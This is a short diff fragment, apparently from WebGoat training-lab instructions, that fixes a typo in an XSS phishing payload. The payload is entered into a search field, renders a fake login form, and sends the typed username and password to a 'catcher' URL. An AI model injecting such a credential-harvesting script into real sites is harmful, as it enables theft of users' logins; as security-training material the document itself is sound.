@@ -5,7 +5,7 @@ The code below is entered into the search field. This renders a form which inclu
 
 </form>
 <script>
-    function submist_phish() {
+    function submit_phish() {
          window.location.href = "http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";}
 </script>
 <form name="phish"><br><br><HR>
